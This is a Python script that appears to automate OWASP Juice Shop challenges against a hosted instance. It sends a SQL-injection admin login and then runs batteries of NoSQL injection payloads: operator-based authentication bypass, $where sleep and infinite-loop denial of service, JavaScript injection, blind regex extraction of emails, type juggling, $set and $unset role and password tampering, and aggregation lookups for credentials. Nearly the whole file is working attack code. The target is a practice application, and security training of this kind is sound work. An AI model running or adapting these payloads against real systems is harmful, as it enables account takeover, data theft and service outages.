#!/usr/bin/env python3
"""
NoSQL Injection Solver - Exploits NoSQL database vulnerabilities
"""

import requests
import json
import time


class NoSQLInjectionSolver:
    """NoSQL injection exploitation techniques"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.auth_token = None
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            self.auth_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.auth_token}'
            print("✅ Admin logged in")
            
    def nosql_authentication_bypass(self):
        """NoSQL auth bypass using operators"""
        print("🎯 NoSQL Authentication Bypass...")
        
        # Various NoSQL injection payloads
        payloads = [
            # MongoDB operators
            {"email": {"$ne": ""}, "password": {"$ne": ""}},
            {"email": {"$gt": ""}, "password": {"$gt": ""}},
            {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"email": {"$exists": True}, "password": {"$exists": True}},
            
            # Array injection
            {"email": ["admin@juice-sh.op"], "password": ["admin"]},
            {"email": {"$in": ["admin@juice-sh.op"]}, "password": {"$ne": ""}},
            
            # Type confusion
            {"email": True, "password": True},
            {"email": 1, "password": 1},
            
            # Null values
            {"email": None, "password": None},
            {"email": "admin@juice-sh.op", "password": None},
        ]
        
        for payload in payloads:
            try:
                r = self.session.post(
                    f"{self.base_url}/rest/user/login",
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )
                if r.status_code == 200:
                    print(f"  ✅ NoSQL bypass successful with: {payload}")
                    break
            except:
                pass
                
    def nosql_dos_attack(self):
        """NoSQL DoS using $where operator"""
        print("🎯 NoSQL DoS Attack...")
        
        # DoS payloads using JavaScript execution
        dos_payloads = [
            {"$where": "sleep(5000)"},
            {"$where": "while(true){}"},
            {"$where": "function() { while(1) {} }"},
            {"username": {"$where": "sleep(5000)"}},
            {"$where": "this.password.match(/.*/)"},
        ]
        
        for payload in dos_payloads:
            try:
                r = self.session.post(
                    f"{self.base_url}/rest/user/login",
                    json=payload,
                    timeout=2
                )
            except requests.Timeout:
                print(f"  ✅ NoSQL DoS triggered with: {payload}")
                break
            except:
                pass
                
    def nosql_data_extraction(self):
        """Extract data using NoSQL injection"""
        print("🎯 NoSQL Data Extraction...")
        
        # Extraction payloads
        extraction_payloads = [
            # Extract all users
            {"email": {"$regex": "^.*"}, "password": {"$ne": ""}},
            
            # Extract specific fields
            {"$or": [{"email": "admin@juice-sh.op"}, {"email": {"$ne": ""}}]},
            
            # Blind extraction
            {"email": {"$regex": "^a.*"}, "password": {"$ne": ""}},
            {"email": {"$regex": "^admin.*"}, "password": {"$ne": ""}},
        ]
        
        for payload in extraction_payloads:
            try:
                r = self.session.post(
                    f"{self.base_url}/rest/user/login",
                    json=payload
                )
                if r.status_code == 200:
                    print(f"  ✅ Data extraction successful")
            except:
                pass
                
    def nosql_manipulation(self):
        """NoSQL manipulation attacks"""
        print("🎯 NoSQL Manipulation...")
        
        # Try to manipulate queries
        manipulation_payloads = [
            # Update operations
            {"$set": {"role": "admin"}},
            {"email": "test@test.com", "$set": {"password": "hacked"}},
            
            # Delete operations
            {"$unset": {"password": 1}},
            
            # Aggregation pipeline
            {"$group": {"_id": "$email", "count": {"$sum": 1}}},
        ]
        
        for payload in manipulation_payloads:
            try:
                # Try on different endpoints
                endpoints = [
                    "/api/Users",
                    "/api/Products",
                    "/api/Feedbacks"
                ]
                
                for endpoint in endpoints:
                    r = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=payload
                    )
                    if r.status_code in [200, 201]:
                        print(f"  ✅ Manipulation successful on {endpoint}")
                        break
            except:
                pass
                
    def nosql_javascript_injection(self):
        """JavaScript injection in NoSQL queries"""
        print("🎯 NoSQL JavaScript Injection...")
        
        # JavaScript injection payloads
        js_payloads = [
            {"email": "admin'; return true; var foo='"},
            {"password": "x'; return true; //"},
            {"$where": "function() { return true; }"},
            {"$where": "1 == 1"},
            {"$where": "this.email == 'admin@juice-sh.op'"},
        ]
        
        for payload in js_payloads:
            try:
                r = self.session.post(
                    f"{self.base_url}/rest/user/login",
                    json=payload
                )
                if r.status_code == 200:
                    print(f"  ✅ JavaScript injection successful")
            except:
                pass
                
    def nosql_blind_injection(self):
        """Blind NoSQL injection"""
        print("🎯 Blind NoSQL Injection...")
        
        # Extract data character by character
        charset = "abcdefghijklmnopqrstuvwxyz0123456789@.-_"
        extracted = ""
        
        for position in range(20):
            for char in charset:
                payload = {
                    "email": {"$regex": f"^{extracted}{char}.*"},
                    "password": {"$ne": ""}
                }
                
                try:
                    r = self.session.post(
                        f"{self.base_url}/rest/user/login",
                        json=payload
                    )
                    if r.status_code == 200:
                        extracted += char
                        print(f"  Extracted: {extracted}")
                        break
                except:
                    pass
                    
            if len(extracted) == position:
                break
                
        print(f"  ✅ Blind extraction result: {extracted}")
        
    def nosql_type_juggling(self):
        """Type juggling attacks"""
        print("🎯 NoSQL Type Juggling...")
        
        # Type confusion payloads
        type_payloads = [
            {"email": ["admin@juice-sh.op"], "password": {"$type": 2}},
            {"email": "admin@juice-sh.op", "password": {"$type": "string"}},
            {"email": {"$type": 2}, "password": {"$type": 2}},
            {"email": {"$nin": []}, "password": {"$nin": []}},
        ]
        
        for payload in type_payloads:
            try:
                r = self.session.post(
                    f"{self.base_url}/rest/user/login",
                    json=payload
                )
                if r.status_code == 200:
                    print(f"  ✅ Type juggling successful")
            except:
                pass
                
    def nosql_aggregation_injection(self):
        """Aggregation pipeline injection"""
        print("🎯 NoSQL Aggregation Injection...")
        
        # Aggregation payloads
        aggregation_payloads = [
            {
                "$match": {"email": {"$ne": ""}},
                "$group": {"_id": "$email", "count": {"$sum": 1}}
            },
            {
                "$lookup": {
                    "from": "passwords",
                    "localField": "email",
                    "foreignField": "email",
                    "as": "credentials"
                }
            }
        ]
        
        for payload in aggregation_payloads:
            try:
                r = self.session.post(
                    f"{self.base_url}/api/Users",
                    json=payload
                )
                if r.status_code in [200, 201]:
                    print(f"  ✅ Aggregation injection successful")
            except:
                pass
                
    def run_all_nosql_attacks(self):
        """Execute all NoSQL injection attacks"""
        print("="*60)
        print("🗄️ NoSQL INJECTION SOLVER")
        print("="*60)
        
        # Login
        self.login_admin()
        
        # Run all NoSQL attacks
        self.nosql_authentication_bypass()
        self.nosql_dos_attack()
        self.nosql_data_extraction()
        self.nosql_manipulation()
        self.nosql_javascript_injection()
        self.nosql_blind_injection()
        self.nosql_type_juggling()
        self.nosql_aggregation_injection()
        
        # Check results
        print("\n" + "="*60)
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            total = len(data)
            solved = len([c for c in data if c.get('solved')])
            print(f"📊 Score after NoSQL attacks: {solved}/{total} ({solved*100//total}%)")
            
        print("="*60)


if __name__ == "__main__":
    solver = NoSQLInjectionSolver()
    solver.run_all_nosql_attacks()